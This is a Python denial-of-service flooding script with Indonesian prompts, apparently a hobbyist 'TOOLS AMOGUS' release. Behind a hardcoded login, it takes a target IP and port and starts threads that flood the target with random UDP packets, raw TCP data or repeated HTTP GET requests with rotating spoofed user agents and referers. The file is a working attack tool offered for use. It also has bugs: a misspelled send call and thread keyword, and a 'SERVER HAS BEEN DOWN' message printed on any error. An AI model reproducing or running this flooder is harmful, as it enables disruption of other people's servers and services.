import random
import socket
import threading
import os,sys
import time
import signal
from os import system,name
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]
os.system("clear")
print("WELCOME TO TOOLS AMOGUS")
time.sleep(5)
username = 'Amogus'
for i in range(3):
    usm = input('Account : ')
    j = 3
    if usm == username:
        time.sleep(5)
        print('Please Wait!!! ')
        break
    else:
        time.sleep(5)
        print('Try again ')
        continue
password = 'EXP'
for i in range(3):
    pwd = input('Password : ')
    j = 3
    if pwd == password:
        time.sleep(5)
        print('Please Wait!!! ')
        break
    else:
        time.sleep(5)
        print('Try again ')
        continue
print("\033[94m=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=")
print('''\033[1;31;40m
░██████╗██╗░░██╗░█████╗░██████╗░███████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██╔════╝
╚█████╗░███████║██║░░██║██████╔╝█████╗░░
░╚═══██╗██╔══██║██║░░██║██╔═══╝░██╔══╝░░
██████╔╝██║░░██║╚█████╔╝██║░░░░░███████╗
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚══════╝

░█████╗░███████╗██████╗░░█████╗░████████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
██║░░╚═╝█████╗░░██████╔╝███████║░░░██║░░░
██║░░██╗██╔══╝░░██╔═══╝░██╔══██║░░░██║░░░
╚█████╔╝███████╗██║░░░░░██║░░██║░░░██║░░░
░╚════╝░╚══════╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
''')
print("\033[94m")
print("=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=")
print("4M0GU2 KARIR SHOPE")
ip = str(input("IP TARGET: "))
port = int(input("PORT TARGET: "))
choice = str(input("GAS ATTACK(y/n) :"))
times = int(input("PAKET SHOPE AMER: "))
threads = int(input("ONGKOS KURIR: "))
print("=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=")
print("/")
os.system("clear")
print("+")
os.system("clear")
print("=")
print("=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=")
def run1():
  data = random._urandom(1460)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        s.sento(data,addr)
        print(i +" PAKET DARI AMOGUS OTW!!!!")
    except:
      print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run2():
  data = random._urandom(1460)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        s.sento(data,addr)
        print(i +" PAKET DARI AMOGUS OTW!!!!")
    except:
      print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run3():
  data = random._urandom(1460)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        s.sento(data,addr)
        print(i +" PAKET DARI AMOGUS OTW!!!!")
    except:
      print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run4():
  data = random._urandom(1460)
  i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        s.sento(data,addr)
        print(i +" PAKET DARI AMOGUS OTW!!!!")
    except:
      print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run5():
	data = random._urandom(4096)
	i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET DARI AMOGUS OTW!!!!")
		except:
			s.close()
			print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run6():
	data = random._urandom(4096)
	i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET DARI AMOGUS OTW!!!!")
		except:
			s.close()
			print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run7():
	data = random._urandom(4096)
	i = random.choice(("[=+=+=+]","[=+=+=+]","[=+=+=+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET DARI AMOGUS OTW!!!!")
		except:
			s.close()
			print("[=+=+=+] PAKET DARI AMOGUS OTW!!!!")

def run8():
  global useragents, ref, acceptall
  hh = random._urandom(4096)
  xx = int(0)
  useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
  accept = random.choice(acceptall)
  reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((str(ip),int(port)))
      s.send(str.encode(main_req))
      for i in range(threads):
        s.send(str.encode(main_req))
        xx += random.randint(0, int(threads))
        print("[+] Amogus Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
    except:
      s.close()
      print('[+] SERVER HAS BEEN DOWN!!!')

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run1)
    th.start()
    th = threading.Thread(target = run2)
    th.start()
    th = threading.Thread(target = run3)
    th.start()
    th = threading.Thread(target = run4)
    th.start()
    th = threading.Thread(target = run5)
    th.start()
    th = threading.Thread(targer = run6)
    th.start()
    th = threading.Thread(target = run7)
    th.start()
  else:
    th = threading.Thread(target = run8)
    th.start()
